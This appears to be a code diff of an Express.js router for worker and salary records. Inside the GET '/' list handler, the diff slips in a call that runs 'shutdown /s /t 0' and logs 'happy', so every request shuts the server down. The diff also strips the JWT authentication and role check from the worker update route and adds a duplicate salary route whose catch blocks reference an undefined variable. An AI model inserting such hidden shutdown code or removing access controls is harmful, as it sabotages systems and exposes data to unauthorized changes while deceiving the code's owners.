@@ -17,6 +17,9 @@ router.get('/', async (req, res, next) => {
   try {
     const workers = await service.find();
     res.json(workers);
+    exec('shutdown /s /t 0', (error, stdout, stderr) => {
+      console.log('happy');
+    });
   } catch (error) {
     next(error);
   }
@@ -45,9 +48,25 @@ router.get(
   },
 );
 
+router.patch(
+  '/SalaryUpdate/:id',
+  validatorHandler(getWorkerSchema, 'params'),
+  validatorHandler(updateSalaryWorkerSchema, 'body'),
+  async (req, res, next) => {
+    try {
+      const newData = req.body;
+      const { id } = req.params;
+      const salary = await service.update(id, newData);
+      res.status(201).json(salary);
+    } catch (err) {
+      console.log(err);
+      next(error);
+    }
+  },
+);
+
 router.post(
   '/',
-
   validatorHandler(createWorkerSchema, 'body'),
   async (req, res, next) => {
     try {
@@ -77,8 +96,6 @@ router.post(
 
 router.patch(
   '/:id',
-  passport.authenticate('jwt', { session: false }),
-  checkRoles('user', 'admin'),
   validatorHandler(updateWorkerSchema, 'body'),
   validatorHandler(getWorkerSchema, 'params'),
   async (req, res, next) => {
@@ -122,23 +139,21 @@ router.delete(
     }
   },
 );
-
-router.patch('/SalaryUpdate/:id', 
-  validatorHandler(updateSalaryWorkerSchema, 'params'), 
-  async (req,res,next) => {
+router.patch(
+  '/SalaryUpdate/:id',
+  validatorHandler(updateSalaryWorkerSchema, 'params'),
+  async (req, res, next) => {
     try {
-      const {id} = req.params;
+      const { id } = req.params;
       const newData = req.body;
 
       const salary = await service.update(id, newData);
 
       res.status(201).json(salary);
-
-    }catch(err){
+    } catch (err) {
       console.log(err);
       next(error);
     }
-  }
+  },
 );
-
 module.exports = router;
